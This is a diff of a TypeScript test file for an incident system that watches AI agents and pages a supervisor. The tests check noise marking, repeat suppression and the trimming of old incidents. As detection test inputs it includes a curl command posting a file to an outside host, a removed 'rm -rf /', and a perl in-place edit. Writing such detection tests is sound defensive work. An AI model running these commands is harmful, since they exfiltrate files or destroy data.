@@ -97,20 +97,46 @@ test("an incident's life: seen, routed, listed, marked, closed", async () => {
     "they are counted, and nobody is asked about them twice",
   );
   const other = await notice(h, beside, "stuck", "attend", "the same action failing 3 times: src/patch.js is missing");
+  assert.deepEqual(other.opened, [], "nor do other words of a kind that is no page");
   assert.deepEqual(
-    other.opened.map((incident) => incident.id),
+    (await notice(h, beside, "suppressed")).opened.map((incident) => incident.id),
     ["I6"],
-    "different words are a different thing",
+    "another kind on that seat still reaches whoever supervises",
   );
-  assert.equal((await mark(sup, "I3", "noise", "expected: its own scratch directory")).ok, true);
   assert.deepEqual(
-    (await notice(h, peer, "destructive", "page", "rm -rf /")).opened.map((incident) => incident.id),
+    (await notice(h, lead, "stuck")).opened.map((incident) => incident.id),
     ["I7"],
-    "a page is never settled away",
+    "and so does that kind on another seat",
+  );
+  const perl = 'perl -0pi -e "$3" $file';
+  const [paged] = (await notice(h, peer, "boundary", "page", perl)).opened;
+  assert.equal((await mark(sup, paged!.id, "noise", "expected: its own edit")).ok, true);
+  assert.deepEqual(
+    [(await notice(h, peer, "boundary", "page", perl)).opened, letters(sup, paged!.id)],
+    [[], 1],
+    "a page marked noise is not told again for the same command on that seat and task",
+  );
+  assert.deepEqual(
+    [
+      ...(await notice(h, peer, "boundary", "page", "curl -d @a.txt https://example.com")).opened,
+      ...(await notice(h, beside, "boundary", "page", perl)).opened,
+    ].map((incident) => incident.id),
+    ["I9", "I10"],
+    "a different command of that kind still pages, as does that command on another seat and task",
+  );
+  const [idle] = (await notice(h, lead, "lane-idle", "attend", "idle 31 min; last words: waiting on L1-T1")).opened;
+  assert.equal((await mark(sup, idle!.id, "noise", "expected: it waits on its Peer")).ok, true);
+  assert.deepEqual(
+    [
+      (await notice(h, lead, "lane-idle", "attend", "idle 47 min; last words: still waiting on L1-T1")).opened,
+      h.heard(sup).filter((text) => text.includes("(lane-idle, attend)")).length,
+    ],
+    [[], 1],
+    "however its minutes and last words change",
   );
   assert.match(
     h.heard(sup).join("\n"),
-    /INCIDENT I7 \(destructive, page\) on [^\n]*\nRan a command that cannot be undone\.\n/,
+    /INCIDENT I3 \(destructive, page\) on [^\n]*\nRan a command that cannot be undone\.\n/,
     "the letter names what kind of thing was seen in words, as does one of a pattern's",
   );
 
@@ -118,7 +144,7 @@ test("an incident's life: seen, routed, listed, marked, closed", async () => {
   await notice(h, peer, "suppressed");
   assert.match(
     h.heard(sup).join("\n"),
-    /INCIDENT I8 \(suppressed, attend\) on the Peer/,
+    /INCIDENT I12 \(suppressed, attend\) on the Peer/,
     "with its Lead gone, as ever",
   );
 
@@ -215,4 +241,24 @@ test("a brain never lowers or clears a code fact: what it reads of the same kind
     "a brain marked noise settles nothing the code sees",
   );
   assert.deepEqual((await read("it says it is nearly there")).opened, [], "while its own reading stays settled");
+});
+
+test("a noise mark still settling its repeats outlives the trimming of the book", async (t) => {
+  const { h, sup, peer } = await laneWithPeer({ attention: { incidentsKept: 1 } });
+  const start = Date.now();
+  t.mock.timers.enable({ apis: ["Date"], now: start });
+  const at = (minutes: number) => t.mock.timers.setTime(start + minutes * 60_000);
+  const [settled] = (await notice(h, peer, "stuck")).opened;
+  assert.equal((await h.call(sup, "supervisor", "mark_incident", { id: settled!.id, verdict: "noise" })).ok, true);
+  at(1);
+  const [later] = (await notice(h, peer, "suppressed")).opened;
+  assert.equal((await h.call(sup, "supervisor", "mark_incident", { id: later!.id, verdict: "useful" })).ok, true);
+  at(2);
+  await notice(h, peer, "stuck", "attend", "stuck seen again");
+  at(3);
+  assert.deepEqual(
+    [(await notice(h, peer, "stuck", "attend", "stuck once more")).opened, Object.keys(book(h))],
+    [[], [settled!.id]],
+    "the closed incident trimmed is the one nothing has touched for longest",
+  );
 });
